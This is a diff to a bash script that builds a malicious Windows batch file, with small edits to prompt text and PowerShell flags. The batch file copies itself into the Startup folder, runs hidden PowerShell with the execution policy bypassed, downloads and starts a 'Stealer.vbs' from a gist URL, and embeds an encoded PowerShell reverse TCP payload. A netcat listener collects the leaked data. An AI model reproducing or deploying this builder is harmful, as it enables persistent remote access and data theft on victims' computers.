@@ -26,7 +26,7 @@ then
 read -p $'\e\n[1;93mEnter The Port: \e[0m' port
 echo""
 printf "\e\n[1;93mListening... On Port\e[0m\e[1;31m $port \e[0m\n"
-printf "\e\n[1;32mType\e[0m\e[1;93mcat Leaked.txt \e[0m\n"
+printf "\e\n[1;32mType: \e[0m\e[1;93mcat Leaked.txt \e[0m\n"
 nc -klvp $port
 sleep 1
 
@@ -44,7 +44,7 @@ printf "\e\n[1;93m^_^ Coverting Powershell File(.ps1) To Batch File(.bat) ^_^\e[
 sleep 1
 echo -e '''copy %0 "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"''' >> $ps_tcp.bat
 echo -e "cd %temp%" >> $ps_tcp.bat
-echo -e '''powershell -noexit -nologo -win hidden -ExecutionPolicy bypass -NoProfile;wget -o Stealer.vbs "https://gist.githubusercontent.com/darkuser744/1b307ea87dda596ea95b3e0053f59962/raw/e039823f7e11e92d6db5f80b13b7a159eb66b22a/.txt"''' >> $ps_tcp.bat
+echo -e '''powershell -win hidden -ExecutionPolicy bypass -NoProfile;wget -o Stealer.vbs "https://gist.githubusercontent.com/darkuser744/1b307ea87dda596ea95b3e0053f59962/raw/e039823f7e11e92d6db5f80b13b7a159eb66b22a/.txt"''' >> $ps_tcp.bat
 echo -e "start Stealer.vbs " >> $ps_tcp.bat
 echo -n "powershell -noexit -nologo -win hidden -ExecutionPolicy bypass -NoProfile -EncodedCommand " >> $ps_tcp.bat;pwsh -c "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([IO.File]::ReadAllText('powershell_reverse_tcp.txt')))" >> $ps_tcp.bat
 echo -e "exit /b" >> $ps_tcp.bat
@@ -57,7 +57,7 @@ read -p $'\n\e[1;96m Did You Need To Listen???[Y/N] : \e[0m' Option
 	if [[ $Option == Y || $Option == y ]]
 	then
 	printf "\e\n[1;93mListening... On Port\e[0m\e[1;31m $port \e[0m\n"
-	printf "\e\n[1;32mType\e[0m\e[1;93mcat Leaked.txt \e[0m\n"
+	printf "\e\n[1;32mType: \e[0m\e[1;93mcat Leaked.txt \e[0m\n"
 	nc -klvp $port
 	sleep 1
 	elif [[ $Option == N || $Option == n ]]
